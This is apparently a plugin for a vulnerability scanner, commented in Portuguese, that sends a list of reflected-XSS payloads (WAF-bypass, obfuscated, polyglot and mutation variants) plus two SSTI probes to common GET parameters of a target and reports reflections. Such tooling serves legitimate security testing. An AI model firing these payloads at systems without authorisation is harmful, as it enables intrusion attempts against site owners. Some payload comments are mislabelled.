# plugins/xss_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner de XSS Refletido (Reflected XSS) via GET.
    Atualizado 2026: WAF bypass payloads, HTTP Parameter Pollution,
    Unicode obfuscation, multi-reflection, Cloudflare/Akamai bypasses.
    Referências: PortSwigger XSS Cheat 2026, CVE-2026-32278.
    """
    import requests

    params = ["q", "search", "query", "s", "keyword", "id", "page", "name",
              "url", "input", "msg", "text", "redirect", "callback", "ref",
              "next", "return_url", "error", "title", "lang"]
    payloads = [
        # Clássicos
        ('<script>alert(1)</script>', "CLASSIC"),
        ('"><img src=x onerror=alert(1)>', "IMG_ONERROR"),
        ("'-alert(1)-'", "JS_CONTEXT"),
        ('<svg onload=alert(1)>', "SVG_ONLOAD"),
        # WAF Bypass 2026 — Cloudflare
        ('<Img/Src/OnError=(alert)(1)>', "CLOUDFLARE_BYPASS_2025"),
        ('<svg/onload=confirm`1`>', "BACKTICK_BYPASS"),
        # Unicode obfuscation
        ('<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>', "UNICODE_BYPASS"),
        # HTML entity bypass
        ('<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', "HTML_ENTITY"),
        # Event manipulation — char before event
        ('<div/onmouseover=alert(1)style=position:fixed;top:0;left:0;width:100%;height:100%>', "MOUSEOVER_FULLSCREEN"),
        # HTTP Parameter Pollution
        ('<script>alert(String.fromCharCode(88,83,83))</script>', "CHARCODE_BYPASS"),
        # Polyglot XSS
        ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0teleseD/teleseona//</stYle/</teleseTitle/</teleseArea/</teleseScript/--><svg/onload=alert()//>", "POLYGLOT"),
        # Next.js / React2Shell related (CVE-2025-55182 context)
        ('{{constructor.constructor("return this")().alert(1)}}', "ANGULAR_SANDBOX_ESCAPE"),
        # DOM clobbering
        ('<form><input name=innerHTML><input name=innerHTML>', "DOM_CLOBBERING"),
        # Mutation XSS
        ('<noscript><p title="</noscript><img src=x onerror=alert(1)>">', "MUTATION_XSS"),
    ]
    vulns = []

    for param in params:
        for payload, method in payloads:
            url = f"http://{target}/?{param}={payload}"
            try:
                resp = requests.get(url, timeout=6, allow_redirects=True)
                if payload in resp.text:
                    vulns.append({
                        "tipo": "XSS_REFLETIDO",
                        "metodo": method,
                        "parametro": param,
                        "payload": payload[:60],
                        "reflexao": True,
                        "status_http": resp.status_code,
                        "severidade": "ALTO",
                    })
                    break
            except Exception:
                continue

        # SSTI check separado
        for ssti_payload, engine in [("{{7*7}}", "JINJA2"), ("${7*7}", "FREEMARKER")]:
            url = f"http://{target}/?{param}={ssti_payload}"
            try:
                resp = requests.get(url, timeout=5)
                if "49" in resp.text and ssti_payload not in resp.text:
                    vulns.append({
                        "tipo": "SSTI_POSSIVEL",
                        "engine": engine,
                        "parametro": param,
                        "severidade": "CRITICO",
                    })
                    break
            except Exception:
                continue

    return {"plugin": "xss_scanner", "resultados": vulns if vulns else "Nenhum XSS refletido detectado"}
